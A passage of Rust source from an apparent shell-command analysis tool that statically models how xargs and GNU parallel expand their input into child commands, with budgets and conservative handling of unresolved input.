            // ::: is an argv list, not a delimited byte stream. An item
            // containing a newline remains one native input record.
            direct_items = Some(source[1..].to_vec());
            StaticStreamEvidence {
                known_fragments: Vec::new(),
                complete: true,
            }
        } else {
            return opaque("native :::: argument-file source unresolved; use declared -a input");
        }
    } else if has_applied_modifier(&resolved.bound, "arg_file") {
        static_arg_file_evidence_for_xargs_scope(request, session, entry, &resolved.bound)
    } else {
        static_stdin_evidence_for_scoped_command(
            caushell_query::QuerySession::from_session(&session),
            &entry.static_payload_scope.parsed_scope,
            entry.static_payload_scope.command_index,
            request.sequence_no,
            &runtime_binding_replay(registry, request, &entry.static_payload_scope.bindings),
            &runtime_binding_replay(
                registry,
                request,
                &entry.static_payload_scope.scope_base_bindings,
            ),
            request.shell_state_before.cwd(),
            !entry.inherited_scope.static_input_cwd_unproven,
            request.home.as_deref(),
            max_depth.saturating_sub(entry.depth),
        )
    };
    let quoted = has_applied_modifier(&resolved.bound, "quote_template");
    let grouped = has_applied_modifier(&resolved.bound, "context_grouping");
    let annotate = |jobs: &mut Vec<ExpandedFrontierEntry>,
                    rendered: crate::support::parallel_jobs::RenderedJob,
                    symbolic_parameters: bool| {
        let origin = std::sync::Arc::new(caushell_runner::NativeTemplateInput {
            source_text: rendered.source,
            origin: std::sync::Arc::new(caushell_runner::NativeInputOrigin {
                producer_node_id: entry.source_node_id.clone(),
                data_ranges: rendered.data_ranges,
                input_slots: vec![
                    if has_applied_modifier(&resolved.bound, "arg_file") {
                        "arg_file"
                    } else {
                        slot
                    }
                    .into(),
                ],
                stdin: separator.is_none() && !has_applied_modifier(&resolved.bound, "arg_file"),
            }),
            symbolic_parameters,
        });
        for job in jobs {
            job.inherited_scope.native_template_input = Some(origin.clone());
            job.inherited_scope.dispatch_stdout_to_parent = true;
        }
    };
    // Unknown bytes are not an unknown template. Compile only replacements
    // proven to remain argv data, keeping their arity/domain and input origin.
    if !evidence.complete {
        let domain = (delimiter == '\0' && !has_applied_modifier(&resolved.bound, "arg_file"))
            .then(|| stdin_path_domain_for_scope(registry, session, request, entry, max_depth))
            .flatten()
            .unwrap_or(caushell_types::RuntimeArgumentDomain::Unbounded);
        let Some(symbolic) = crate::support::parallel_jobs::symbolic_job(
            &words,
            quoted,
            grouped,
            entry.shell_kind,
            &domain,
        ) else {
            return opaque("native job input or replacement structure is unresolved");
        };
        let mut jobs = native_shell_job_children_with_inputs(
            registry,
            request,
            entry,
            "parallel",
            0,
            &symbolic.rendered.source,
            false,
            max_depth,
            &symbolic.inputs,
        );
        annotate(&mut jobs, symbolic.rendered, true);
        return jobs;
    }
    let payload = evidence.known_fragments.concat();
    let items = direct_items.unwrap_or_else(|| {
        payload
            .split_terminator(delimiter)
            .map(str::to_owned)
            .collect()
    });
    if items.len() > 128 || items.iter().map(String::len).sum::<usize>() > 64 * 1024 {
        return opaque("native job expansion budget exceeded");
    }
    let mut candidates = Vec::new();
    if grouped {
        // Native batching consumes consecutive source records. Enumerate
        // possible batches instead of guessing CPU count or ARG_MAX.
        let numbered = words.iter().any(|w| w.contains("{#}"));
        for start in 0..items.len() {
            for end in start + 1..=items.len() {
                for job in 1..=if numbered { start + 1 } else { 1 } {
                    candidates.push((start, end, job));
                    if candidates.len() > 128 {
                        return opaque("native grouped job expansion budget exceeded");
                    }
                }
            }
        }
    } else {
        candidates.extend((0..items.len()).map(|i| (i, i + 1, i + 1)));
    }
    let mut children = Vec::new();
    let mut total_bytes = 0usize;
    for (index, (start, end, job)) in candidates.into_iter().enumerate() {
        let Some(rendered) = (if grouped {
            crate::support::parallel_jobs::render_group_tracked(
                &words,
                &items[start..end],
                quoted,
                job,
            )
        } else {
            crate::support::parallel_jobs::render_tracked(&words, &items[start], quoted, job)
        }) else {
            return opaque("native replacement grammar or quoting unresolved");
        };
        total_bytes = total_bytes.saturating_add(rendered.source.len());
        if total_bytes > 256 * 1024 {
            return opaque("native expanded source budget exceeded");
        }
        let mut jobs = native_shell_job_children(
            registry,
            request,
            entry,
            "parallel",
            index,
            &rendered.source,
            false,
            max_depth,
        );
        annotate(&mut jobs, rendered, false);
        children.extend(jobs);
    }
    children
}

fn expanded_static_xargs_children(
    registry: &ProfileRegistry,
    session: SessionView<'_>,
    request: &CheckRequest,
    entry: &ExpandedFrontierEntry,
    resolved: &caushell_profile::ResolvedInvocationArtifact,
    max_nested_parse_depth: u8,
    arity_budget: &mut usize,
    observed: &mut super::observed_native_inputs::ObservedInputs,
) -> Vec<ExpandedFrontierEntry> {
    if resolved.normalized_command_name.as_str() != "xargs"
        || resolved.bound.form_id.as_str() != "dispatch_from_stdin"
    {
        return Vec::new();
    }

    let mut candidates = collect_dispatch_command_projection(&resolved.bound).resolved;
    let Some(candidate) = candidates.pop() else {
        return Vec::new();
    };
    let config = xargs_static_expansion_config(resolved);
    let insertion_index = if has_applied_modifier(&resolved.bound, "insert_batch") {
        let Some(token) = config.insert_batch_token.as_deref() else {
            return native_shell_job_children(
                registry,
                request,
                entry,
                "xargs-insert",
                0,
                "unknown xargs insertion marker",
                true,
                max_nested_parse_depth,
            );
        };
        let initial = std::iter::once(&candidate.command).chain(candidate.argv.iter());
        let Some(values) = initial
            .map(dispatch_argument_scalar)
            .collect::<Option<Vec<_>>>()
        else {
            return native_shell_job_children(
                registry,
                request,
                entry,
                "xargs-insert",
                0,
                "unknown xargs initial argv",
                true,
                max_nested_parse_depth,
            );
        };
        values.iter().position(|value| value == token)
    } else {
        None
    };

    let observed_input = observed
        .inputs
        .get(&entry.source_node_id)
        .filter(|i| {
            !has_applied_modifier(&resolved.bound, "arg_file")
                && !entry.static_payload_scope.stdin_is_parent_output
                && !entry.inherited_scope.static_input_cwd_unproven
                && i.scope == entry.static_payload_scope.parsed_scope
                && i.bindings == entry.bindings
        });
    let native = observed_input.map(|i| {
        let groups = observed_xargs_groups(&i.records, &config).and_then(|groups| {
            if has_applied_modifier(&resolved.bound, "max_chars") {
                return Err("native size-limited batching is unresolved".into());
            }
            let fixed = std::iter::once(&candidate.command)
                .chain(candidate.argv.iter())
                .map(|a| a.text.len().saturating_add(1))
                .sum::<usize>();
            let bytes = groups
                .iter()
                .flatten()
                .map(|s| s.len().saturating_add(1))
                .sum::<usize>();
            if fixed.saturating_mul(groups.len()).saturating_add(bytes) > 256 * 1024 {
                Err("native argv byte budget exceeded".into())
            } else {
                Ok(groups)
            }
        });
        (i.records.node_id.clone(), groups)
    });
    if let Some((producer, groups)) = &native {
        observed.decoded.insert(
            entry.source_node_id.clone(),
            caushell_types::NativeInputDecodeEvidence {
                node_id: entry.source_node_id.0.clone(),
                producer_node_id: producer.clone(),
                complete: groups.is_ok(),
                alternative_groups: groups.as_ref().map_or(0, Vec::len),
                gap: groups.as_ref().err().cloned(),
                rejected_candidate_encoding: None,
                empty_nul_path_snapshot: observed_input.is_some_and(|i| i.empty_nul_path_snapshot)
                    && config.decoding_proved
                    && matches!(config.item_mode, XargsItemMode::NullSeparated)
                    && matches!(config.dispatch_mode, XargsDispatchMode::AppendAll)
                    && config.eof_marker.is_none()
                    && config.insert_batch_token.is_none()
                    && !config.requires_confirmation,
            },
        );
    }
    let evidence = if native.is_some() {
        StaticStreamEvidence {
            known_fragments: Vec::new(),
            complete: false,
        }
    } else if has_applied_modifier(&resolved.bound, "arg_file") {
        static_arg_file_evidence_for_xargs_scope(request, session, entry, &resolved.bound)
    } else {
        static_stdin_evidence_for_scoped_command(
            caushell_query::QuerySession::from_session(&session),
            &entry.static_payload_scope.parsed_scope,
            entry.static_payload_scope.command_index,
            request.sequence_no,
            &runtime_binding_replay(registry, request, &entry.static_payload_scope.bindings),
            &runtime_binding_replay(
                registry,
                request,
                &entry.static_payload_scope.scope_base_bindings,
            ),
            request.shell_state_before.cwd(),
            !entry.inherited_scope.static_input_cwd_unproven,
            request.home.as_deref(),
            max_nested_parse_depth.saturating_sub(entry.depth),
        )
    };
    let sequence_items = if native.is_none() && !evidence.complete
        && let XargsDispatchMode::ReplaceToken { token } = &config.dispatch_mode
        && dispatch_argument_scalar(&candidate.command).is_some_and(|name| !name.contains(token))
    {
        fixed_sequence_replacement_items(registry, entry, resolved, &config)
    } else {
        None
    };
    let enumerated_sequence = sequence_items.is_some();
    // A domain proof is useful even when none of the concrete input bytes are
    // known. Never reinterpret it as literal shell text or an exact argv list.
    let input_domain = if native.is_none() && config.decoding_proved && !evidence.complete
        && !enumerated_sequence
    {
        match config.item_mode {
            XargsItemMode::NullSeparated if !has_applied_modifier(&resolved.bound, "arg_file") => {
                stdin_path_domain_for_scope(registry, session, request, entry, max_nested_parse_depth)
            }
            XargsItemMode::WhitespaceSeparated
                if resolved.bound.applied_modifiers.is_empty()
                    && candidate.lookup_domain == caushell_profile::CommandLookupDomain::External
                    && dispatch_argument_scalar(&candidate.command).as_deref() == Some("mkdir")
                    && matches!(candidate.argv.as_slice(), [flag]
                        if dispatch_argument_scalar(flag).as_deref() == Some("-p")) =>
            {
                stdin_hexadecimal_path_domain(registry, session, request, entry)
            }
            _ => None,
        }
    } else {
        None
    };
    // Partial fragments have no guaranteed offset: unknown bytes may precede
    // them, join their quoting, or shift every positional argument. Keep them
    // as advisory evidence, never as a proven argv prefix.
    let payloads = if evidence.complete && config.decoding_proved {
        evidence.known_fragments.as_slice()
    } else {
        &[]
    };
    let decoded_items = sequence_items.or_else(|| {
        xargs_items_from_payloads(payloads, &config.item_mode, config.eof_marker.as_deref())
    });
    // A failed native input decoder is not proof of an empty argv batch.
    let input_complete = config.decoding_proved && (evidence.complete || enumerated_sequence)
        && decoded_items.is_some();
    let items = decoded_items
        .unwrap_or_default()
        .into_iter()
        .map(XargsItem::Known)
        .collect::<Vec<_>>();
    if input_complete && items.is_empty() && !config.run_if_empty {
        return Vec::new();
    }

    let command_span = candidate.command.span.clone();
    let mut groups: Vec<Vec<XargsItem>> = match &config.dispatch_mode {
        XargsDispatchMode::AppendAll => vec![items],
        XargsDispatchMode::ReplaceToken { .. } => {
            items.into_iter().map(|item| vec![item]).collect()
        }
        XargsDispatchMode::MaxArgs { max_args } if *max_args > 0 => items
            .chunks(*max_args)
            .map(|chunk| chunk.to_vec())
            .collect(),
        XargsDispatchMode::MaxLines { max_lines } if *max_lines > 0 => xargs_grouped_lines(
            payloads,
            &config.item_mode,
            *max_lines,
            config.eof_marker.as_deref(),
        )
        .map(|groups| {
            groups
                .into_iter()
                .map(|group| group.into_iter().map(XargsItem::Known).collect())
                .collect()
        })
        .unwrap_or_else(|| vec![vec![XargsItem::UnknownTail]]),
        _ => return Vec::new(),
    };
    if groups.is_empty() && input_complete && config.run_if_empty {
        groups.push(Vec::new());
    }
    if !input_complete {
        // The unresolved portion may contain any number of argv items.
        // One typed tail marker keeps the child incomplete without claiming a
        // precise arity or turning input bytes into shell source.
        if matches!(config.dispatch_mode, XargsDispatchMode::AppendAll) {
            if groups.is_empty() {
                groups.push(Vec::new());
            }
            groups[0].push(XargsItem::UnknownTail);
        } else {
            // Default xargs can invoke the fixed argv on zero input. -r
            // suppresses only that call, not the nonempty unknown-input job.
            if groups.is_empty() && config.run_if_empty {
                groups.push(Vec::new());
            }
            groups.push(vec![XargsItem::UnknownTail]);
        }
        groups = bounded_xargs_unknown_groups(&config, groups, arity_budget);
    }
    let symbolic_input = !input_complete && !matches!(&native, Some((_, Ok(_))));
    let alternative_order = native.is_some()
        && observed
            .inputs
            .get(&entry.source_node_id)
            .is_some_and(|i| i.records.order == caushell_types::StreamRecordOrder::Unspecified);
    if let Some((_, Ok(native_groups))) = native {
        groups = native_groups
            .into_iter()
            .map(|group| group.into_iter().map(XargsItem::Known).collect())
            .collect();
    }

    let replace_token = match config.dispatch_mode {
        XargsDispatchMode::ReplaceToken { ref token } => Some(token.as_str()),
        _ => None,
    };
    let mut children = Vec::new();
    let arity_alternatives = groups
        .iter()
        .flatten()
        .any(|item| matches!(item, XargsItem::UnknownScalar));
    for (command_index, group) in groups.into_iter().enumerate() {
        let mut child_candidate = candidate.clone();
        let mut data_ranges = Vec::new();
        let mut projections = Vec::new();
        let mut next_byte = child_candidate
            .argv
            .iter()
            .map(|argument| argument.span.end_byte)
            .max()
            .unwrap_or(command_span.end_byte)
            .saturating_add(1);
        if let Some(replace_token) = replace_token {
            let item = group.first();
            let unresolved = matches!(item, Some(XargsItem::UnknownTail));
            for argument in &mut child_candidate.argv {
                if !argument.text.contains(replace_token) {
                    // Untouched argv keeps its existing shell spelling and
                    // materialization; do not literalize ~ or other expansions.
                    continue;
                }
                let tilde_unresolved = !argument.runtime_data
                    && !argument.quoted
                    && argument.text.starts_with('~')
                    && match crate::path::expand_home_path_spelling(
                        &argument.text,
                        request.home.as_deref(),
                    ) {
                        Some(value) => {
                            argument.text = value;
                            false
                        }
                        None => true,
                    };
                // xargs substitutes AFTER the shell's quote removal, without
                // shell-evaluating captured runtime bytes a second time.
                if !argument.runtime_data
                    && argument.implicit_input_source.is_none()
                    && !tilde_unresolved
                {
                    let projected = caushell_profile::ProjectedArg {
                        word_context: Default::default(),
                        text: argument.text.clone(),
                        quoted: argument.quoted,
                        node_kind: argument.node_kind.clone(),
                        span: argument.span.clone(),
                        implicit_input_source: None,
                        runtime_argument_domain: None,
                        runtime_data: false,
                        substitution_shape: None,
                        native_region_field: None,
                        lexical_field_prefix: None,
                        kind: caushell_profile::ProjectedArgKind::Positional,
                    };
                    if let Some(value) =
                        caushell_profile::argument_structure(&projected).exact_value()
                    {
                        argument.text = value.to_string();
                        argument.runtime_data = true;
                    }
                }
                if !argument.text.contains(replace_token) {
                    continue;
                }
                if unresolved {
                    // Only decoded native argv can certify literal affixes.
                    // Unresolved shell text is not an xargs template proof.
                    let domain = if tilde_unresolved
                        || !argument.runtime_data
                        || argument.implicit_input_source.is_some()
                    {
                        caushell_types::RuntimeArgumentDomain::Unbounded
                    } else {
                        input_domain
                            .as_ref()
                            .unwrap_or(&caushell_types::RuntimeArgumentDomain::Unbounded)
                            .substitute_into(&argument.text, replace_token)
                    };
                    argument.text.clear();
                    argument.runtime_data = false;
                    argument.implicit_input_source =
                        Some(caushell_types::ImplicitInputSource::StdinData);
                    argument.runtime_argument_domain = Some(domain);
                    argument.node_kind = "runtime_scalar".into();
                    argument.quoted = true;
                } else {
                    let Some(XargsItem::Known(item)) = item else {
                        continue;
                    };
                    let exact = argument.runtime_data
                        && argument.implicit_input_source.is_none()
                        && !tilde_unresolved;
                    let (value, ranges) = crate::support::replace_native_argument(
                        &argument.text,
                        replace_token,
                        item,
                    );
                    argument.text = value;
                    if exact {
                        projections.push(caushell_runner::NativeArgumentProjection {
                            argument_span: argument.span.clone(),
                            value: argument.text.clone(),
                            data_ranges: ranges,
                        });
                    }
                    argument.runtime_data = !tilde_unresolved;
                }
                data_ranges.push(argument.span.start_byte..argument.span.end_byte);
            }
            // -I replaces occurrences in initial arguments; unlike append
            // mode, it does not append the input when there is no placeholder.
        } else {
            // BSD -J removes only the first exact argv marker. Keep the suffix
            // after the entire input batch, not after each input item.
            let suffix = insertion_index.map(|index| {
                if index == 0 {
                    std::mem::take(&mut child_candidate.argv)
                } else {
                    let suffix = child_candidate.argv.split_off(index);
                    child_candidate.argv.pop();
                    suffix
                }
            });
            for item in group {
                match item {
                    XargsItem::Known(item) => append_xargs_data_argument(
                        &mut child_candidate,
                        item,
                        None,
                        None,
                        next_byte,
                        false,
                    ),
                    XargsItem::UnknownTail => append_xargs_data_argument(
                        &mut child_candidate,
                        String::new(),
                        Some(caushell_types::ImplicitInputSource::StdinData),
                        input_domain.as_ref(),
                        next_byte,
                        true,
                    ),
                    XargsItem::UnknownScalar => append_xargs_data_argument(
                        &mut child_candidate,
                        String::new(),
                        Some(caushell_types::ImplicitInputSource::StdinData),
                        input_domain.as_ref(),
                        next_byte,
                        false,
                    ),
                }
                let argument = child_candidate
                    .argv
                    .last()
                    .expect("appended native argument");
                data_ranges.push(argument.span.start_byte..argument.span.end_byte);
                if argument.runtime_data && argument.implicit_input_source.is_none() {
                    projections.push(caushell_runner::NativeArgumentProjection {
                        argument_span: argument.span.clone(),
                        value: argument.text.clone(),
                        data_ranges: vec![0..argument.text.len()],
                    });
                }
                next_byte = next_byte.saturating_add(1);
            }
            if let Some(suffix) = suffix {
                child_candidate.argv.extend(suffix);
                if insertion_index == Some(0) {
                    if child_candidate.argv.is_empty() {
                        // No utility remains: do not invent an executable.
                        continue;
                    }
                    child_candidate.command = child_candidate.argv.remove(0);
                }
            }
        }

        let mut command = child_candidate.to_command_fact();
        // A tool-level confirmation is a possible execution branch, not proof
        // that the child has no effects. Preserve its conditional status.
        command.conditional_execution |=
            config.requires_confirmation || arity_alternatives || alternative_order || enumerated_sequence;
        let child_bindings =
            dispatch_child_session_bindings(&entry.bindings, &child_candidate, &command);
        let parsed_child = empty_dispatch_scope(command.clone(), entry.shell_kind);
        let mut resolved_child = caushell_profile::resolve_invocation_artifact_with_stdout_proofs(
            registry,
            &command,
            InvocationRuntimeContext::new().with_shell_kind(entry.shell_kind),
            &child_bindings,
            &forwarded_substitution_shapes(resolved, &command),
        );
        if symbolic_input && config.decoding_proved && !has_applied_modifier(&resolved.bound, "arg_file") {
            super::native_effect_envelope::refine(
                registry,
                &command,
                &child_bindings,
                entry.shell_kind,
                &mut resolved_child,
            );
        }
        let source_node_id =
            expanded_virtual_node_id("xargs", &entry.source_node_id, command_index);
        let mut inherited_scope = entry.inherited_scope.clone();
        // GNU and BSD/macOS xargs feed utility argv from their input stream,
        // but attach /dev/null to utility FD 0 by default. GNU -a preserves
        // xargs' own FD 0 instead. An incomplete parent cannot prove routing;
        // unsupported controls (including -o) keep the original uncertainty.
        inherited_scope.native_stdin_route = if resolved.bound.operation_semantics_unresolved
            || !resolved.bound.residuals.is_empty()
        {
            None
        } else if has_applied_modifier(&resolved.bound, "arg_file") {
            execution_unit_inherits_stdin(entry)
                .then(|| entry.inherited_scope.native_stdin_route.clone())
                .flatten()
        } else {
            Some(caushell_runner::NativeStdinRoute::Null {
                dispatcher_node_id: entry.source_node_id.clone(),
            })
        };
        inherited_scope.native_argument_inputs = crate::support::forwarded_native_argument_inputs(
            &entry.inherited_scope,
            &entry.source_node_id,
            &source_node_id,
            &command,
        );
        if !data_ranges.is_empty() {
            let arg_file = has_applied_modifier(&resolved.bound, "arg_file");
            inherited_scope
                .native_argument_inputs
                .push(caushell_runner::NativeArgumentInput {
                    consumer_node_id: source_node_id.clone(),
                    origin: std::sync::Arc::new(caushell_runner::NativeInputOrigin {
                        producer_node_id: entry.source_node_id.clone(),
                        data_ranges,
                        input_slots: if arg_file {
                            vec!["arg_file".into()]
                        } else {
                            Vec::new()
                        },
                        stdin: !arg_file,
                    }),
                    projections,
                });
        }
        children.push(ExpandedFrontierEntry {
            source_node_id,
            command_ref: ParsedCommandRef::new(0, command.span.clone()),
            parsed_scope: parsed_child.clone(),
            rendered_command_text: command.text.clone(),
            result: resolved_child,
            shell_kind: entry.shell_kind,
            root_command_index: entry.root_command_index,
            depth: entry.depth.saturating_add(1),
            parent_execution_node_id: entry.source_node_id.clone(),
            bindings: child_bindings.clone(),
            static_payload_scope: StaticPayloadLookupScope {
                parsed_scope: parsed_child,
                command_index: 0,
                bindings: child_bindings.clone(),
                scope_base_bindings: child_bindings,
                stdin_is_parent_output: false,
            },
            history_anchor_node_id: entry.history_anchor_node_id.clone(),
            origin_kind: ExecutionUnitOriginKind::StaticXargs,
            origin_index: command_index,
            origin_locator: ExecutionUnitOriginLocator::None,
            inherited_scope,
        });
    }
    children
}

/// In replacement mode each complete line launches its own independent job.
/// A small fixed seq can emit only these decimal records, even if it stops
/// early. This enumeration is local to xargs; it asserts no observed bytes.
fn fixed_sequence_replacement_items(
    registry: &ProfileRegistry,
    entry: &ExpandedFrontierEntry,
    consumer: &caushell_profile::ResolvedInvocationArtifact,
    config: &XargsStaticExpansionConfig,
) -> Option<Vec<String>> {
    use caushell_profile::ProfileSourceKind::BuiltIn;
    let scope = &entry.static_payload_scope;
    let parsed = &scope.parsed_scope;
    if entry.origin_kind != ExecutionUnitOriginKind::TopLevel
        || entry.depth != 0
        || entry.shell_kind != caushell_types::ShellKind::Bash
        || scope.stdin_is_parent_output
        || scope.command_index != 1
        || parsed.status != caushell_parse::ParseStatus::Complete
        || !parsed.diagnostics.is_empty()
        || !parsed.redirections.is_empty()
        || !config.decoding_proved
        || config.run_if_empty
        || config.eof_marker.is_some()
        || !matches!(config.dispatch_mode, XargsDispatchMode::ReplaceToken { .. })
        || !matches!(config.item_mode, XargsItemMode::NewlineSeparated)
        || consumer.bound.applied_modifiers.iter().any(|modifier| {
            !matches!(modifier.as_str(),
                "replace_token" | "replace_token_optional" | "max_processes" | "no_run_if_empty")
        })
    {
        return None;
    }
    let [producer, command] = parsed.commands.as_slice() else { return None };
    let bindings = &scope.scope_base_bindings;
    if ["seq", "xargs"].iter().any(|name| {
        bindings.function_binding(name).is_some()
            || bindings.profile_has_alias_shadow(name)
            || !registry.lookup(name).profile.is_some_and(|p| p.trust.source == BuiltIn)
    }) || producer.command_name.as_deref() != Some("seq")
        || producer.command_name_runtime_data
        || producer.pipeline_span.is_none()
        || producer.pipeline_span != command.pipeline_span
        || [producer, command].iter().any(|c| {
            c.guarded || c.conditional_execution || !c.prefix_assignments.is_empty()
        })
        || !parsed.raw_command.get(..producer.span.start_byte)?.trim().is_empty()
        || parsed.raw_command.get(producer.span.end_byte..command.span.start_byte)?.trim() != "|"
        || !parsed.raw_command.get(command.span.end_byte..)?.trim().is_empty()
    {
        return None;
    }
    let [limit] = producer.tokens.as_slice() else { return None };
    let stop = limit.text.parse::<u8>().ok()?;
    if !(1..=32).contains(&stop) || limit.text != stop.to_string()
        || limit.implicit_input_source.is_some() || !limit.command_substitutions.is_empty()
    {
        return None;
    }
    let ResolveInvocationArtifactResult::Resolved(seq) =
        caushell_profile::resolve_invocation_artifact_with_bindings(
            registry, producer, InvocationRuntimeContext::new().with_shell_kind(entry.shell_kind),
            bindings,
        )
    else {
        return None;
    };
    if seq.bound.form_id.as_str() != "integer_sequence" || !seq.proven_arithmetic_stdout() {
        return None;
    }
    Some((1..=stop).map(|value| value.to_string()).collect())
}

#[derive(Debug, Clone, PartialEq, Eq)]
enum XargsItem {
    Known(String),
    UnknownScalar,
    UnknownTail,
}

fn bounded_xargs_unknown_groups(
    config: &XargsStaticExpansionConfig,
    groups: Vec<Vec<XargsItem>>,
    arity_budget: &mut usize,
) -> Vec<Vec<XargsItem>> {
    // Enumerate complete arity alternatives, never just the largest batch.
    // Larger/unbounded batches retain the original unresolved list marker.
    const MAX_SYMBOLIC_BATCH_ARGS: usize = 8;
    let max_args = match config.dispatch_mode {
        XargsDispatchMode::MaxArgs { max_args } => max_args,
        XargsDispatchMode::MaxLines { max_lines }
            if matches!(
                config.item_mode,
                XargsItemMode::NullSeparated | XargsItemMode::Delimited { .. }
            ) =>
        {
            max_lines
        }
        _ => return groups,
    };
    if max_args == 0 || max_args > MAX_SYMBOLIC_BATCH_ARGS {
        return groups;
    }
    let extra_groups = groups
        .iter()
        .filter(|group| group.as_slice() == [XargsItem::UnknownTail])
        .count()
        .saturating_mul(max_args - 1);
    if extra_groups > *arity_budget {
        return groups;
    }
    *arity_budget -= extra_groups;
    groups
        .into_iter()
        .flat_map(|group| {
            if group.as_slice() == [XargsItem::UnknownTail] {
                (1..=max_args)
                    .map(|count| vec![XargsItem::UnknownScalar; count])
                    .collect()
            } else {
                vec![group]
            }
        })
        .collect()
}

fn refresh_path_list_targets(
    registry: &ProfileRegistry,
    session: SessionView<'_>,
    request: &CheckRequest,
    entry: &mut ExpandedFrontierEntry,
    max_depth: u8,
    observed_stdin: Option<&str>,
) {
    let ResolveInvocationArtifactResult::Resolved(resolved) = &entry.result else {
        return;
    };
    if !resolved
        .bound
        .effects
        .iter()
        .any(|effect| effect.path_list.is_some())
    {
        return;
    }
    let scope = &entry.static_payload_scope;
    if resolved.proven_stream_contract().is_none()
        || scope.stdin_is_parent_output
        || entry.inherited_scope.static_input_cwd_unproven
        || entry.inherited_scope.native_template_input.is_some()
    {
        return;
    }
    let evidence = observed_stdin.map_or_else(|| static_stdin_evidence_for_scoped_command(
        caushell_query::QuerySession::from_session(&session),
        &scope.parsed_scope,
        scope.command_index,
        request.sequence_no,
        &runtime_binding_replay(registry, request, &scope.bindings),
        &runtime_binding_replay(registry, request, &scope.scope_base_bindings),
        request.shell_state_before.cwd(),
        true,
        request.home.as_deref(),
        max_depth.saturating_sub(entry.depth),
    ), |payload| StaticStreamEvidence {
        known_fragments: vec![payload.to_owned()],
        complete: true,
    });
    let wants_nul = resolved
        .bound
        .effects
        .iter()
        .filter_map(|effect| effect.path_list.as_ref())
        .any(|contract| {
            contract.separator == caushell_profile::PathListSeparator::Nul
                || contract.nul_modifier.as_ref().is_some_and(|name| {
                    resolved
                        .bound
                        .applied_modifiers
                        .iter()
                        .any(|id| id.as_str() == name)
                })
        });
    let domain = (!evidence.complete && wants_nul)
        .then(|| stdin_path_domain_for_scope(registry, session, request, entry, max_depth))
        .flatten();
    if let ResolveInvocationArtifactResult::Resolved(resolved) = &mut entry.result {
        crate::support::bind_path_list_targets(&mut resolved.bound, evidence, domain);
    }
}

/// The external printf format owns all stdout bytes. Arbitrary upstream
/// operands can affect the numbers and batch count, but cannot add options
/// to the final xargs or introduce absolute paths or parent components.
fn stdin_hexadecimal_path_domain(
    registry: &ProfileRegistry,
    session: SessionView<'_>,
    request: &CheckRequest,
    entry: &ExpandedFrontierEntry,
) -> Option<caushell_types::RuntimeArgumentDomain> {
    use crate::support::{EffectiveStdinSource, VariableBindingReplay, effective_stdin_source};
    use caushell_profile::{CommandLookupDomain, ProfileSourceKind};

    let scope = &entry.static_payload_scope;
    let parsed = &scope.parsed_scope;
    if entry.shell_kind != caushell_types::ShellKind::Bash
        || entry.depth != 0
        || entry.inherited_scope.static_input_cwd_unproven
        || scope.stdin_is_parent_output
        || effective_stdin_source(parsed, scope.command_index) != EffectiveStdinSource::Inherited
        || crate::support::scope_has_prior_directory_transition(parsed, scope.command_index)
    {
        return None;
    }
    let producer_index = crate::support::collect_pipeline_groups(parsed)
        .iter()
        .find_map(|group| {
            let position = group.commands.iter().position(|stage| {
                stage.command_index == scope.command_index
            })?;
            Some(group.commands.get(position.checked_sub(1)?)?.command_index)
        })?;
    let command = parsed.commands.get(producer_index)?;
    let consumer = parsed.commands.get(scope.command_index)?;
    if command.command_name.as_deref() != Some("xargs")
        || command.command_name_runtime_data
        || !command.prefix_assignments.is_empty()
        || command.guarded
        || command.conditional_execution
        || command.control_flow_span.is_some()
        || command.subshell_span.is_some()
        || command.terminator.is_some()
        || parsed.raw_command
            .get(command.top_level_span.start_byte..command.top_level_span.end_byte)?
            .trim() != parsed.raw_command.trim()
        || parsed.raw_command.get(command.span.end_byte..consumer.span.start_byte)?.trim() != "|"
        || !crate::support::stdout_is_direct_pipeline(parsed, producer_index, command)
    {
        return None;
    }

    // Inspect only literal argv of the native dispatcher. No replacement mode,
    // concurrent formatter, shell word expansion or format operand from stdin
    // participates in this proof.
    let argv = command.tokens.iter().map(|arg| {
        caushell_parse::decode_static_shell_argument(&arg.text, arg.quoted, &arg.node_kind)
    }).collect::<Option<Vec<_>>>()?;
    let valid_count = match argv.as_slice() {
        [count, tool, format] if tool == "printf" && format == r"%02x/%02x\n" => {
            count.strip_prefix("-n").and_then(parse_positive_usize).is_some()
        }
        [flag, count, tool, format]
            if flag == "-n" && tool == "printf" && format == r"%02x/%02x\n" =>
        {
            parse_positive_usize(count).is_some()
        }
        _ => false,
    };
    if !valid_count
        || !registry.lookup("xargs").profile.is_some_and(|p| p.trust.source == ProfileSourceKind::BuiltIn)
        || !registry.lookup_in_domain("printf", true, &CommandLookupDomain::External)
            .profile.is_some_and(|p| p.trust.source == ProfileSourceKind::BuiltIn)
    {
        return None;
    }
    let mut aliases = alias_bindings(session.summary(), request);
    for earlier in parsed.commands.iter().take(producer_index) {
        apply_alias_command(&mut aliases, earlier, request.sequence_no);
    }
    let bindings = runtime_binding_replay(registry, request, &scope.scope_base_bindings)
        .apply_before(scope.scope_base_bindings.clone(), parsed, command.span.start_byte, request.sequence_no);
    if aliases.contains_key("xargs")
        || bindings.function_binding("xargs").is_some()
        || bindings.profile_has_alias_shadow("xargs")
    {
        return None;
    }
    let ResolveInvocationArtifactResult::Resolved(formatter) = resolve_invocation_artifact_with_bindings(
        registry, command, runtime_context_for_parsed_command(parsed, producer_index, command), &bindings,
    ) else {
        return None;
    };
    (formatter.bound.form_id.as_str() == "dispatch_from_stdin"
        && formatter.bound.residuals.is_empty()
        && !formatter.bound.operation_semantics_unresolved
        && matches!(formatter.bound.applied_modifiers.as_slice(), [m] if m.as_str() == "max_args"))
        .then_some(caushell_types::RuntimeArgumentDomain::HexadecimalRelativePath)
}

fn stdin_path_domain_for_scope(
    registry: &ProfileRegistry,
    session: SessionView<'_>,
    request: &CheckRequest,
    entry: &ExpandedFrontierEntry,
    max_depth: u8,
) -> Option<caushell_types::RuntimeArgumentDomain> {
    use crate::support::{
        VariableBindingReplay, scope_has_prior_directory_transition, stdin_path_records,
    };
    let scope = &entry.static_payload_scope;
    if scope.stdin_is_parent_output
        || scope_has_prior_directory_transition(&scope.parsed_scope, scope.command_index)
    {
        return None;
    }
    if entry.inherited_scope.static_input_cwd_unproven {
        return None;
    }
    let cwd = request.shell_state_before.cwd();
    let replay = runtime_binding_replay(registry, request, &scope.scope_base_bindings);
    let records = stdin_path_records(
        &scope.parsed_scope,
        scope.command_index,
        cwd,
        request.home.as_deref(),
        usize::from(max_depth.saturating_sub(entry.depth)).min(64),
        |index| {
            let command = scope.parsed_scope.commands.get(index)?;
            let mut aliases = alias_bindings(session.summary(), request);
